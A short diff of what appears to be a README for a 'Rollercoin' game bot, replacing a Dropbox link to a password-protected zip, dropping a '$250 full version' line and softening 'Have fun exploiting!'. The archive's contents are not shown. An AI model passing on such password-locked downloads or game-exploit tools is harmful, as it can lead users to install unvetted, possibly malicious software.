@@ -21,11 +21,12 @@ Jabber DecozelCrypto@thesecure.biz
 
 Telegram - @DecozelCrypto
 
-Full Version worth 250$
 
-[Click to download the Rollercoin](https://www.dropbox.com/s/j9bq43kgzl7vpab/RollerCoin.zip?dl=1)<br>
+[Click to download the Rollercoin](https://www.dropbox.com/s/6trqs0jqzwbv9tg/Rollercoin%20Bot%20By%20DecozelCrypto.zip?dl=1)<br>
 Password- DecozelCrypto
 
-Have fun exploiting! :)
+Have fun game! :)
 
+Update 2.1 (11.10.2022)
+Fix bug
 
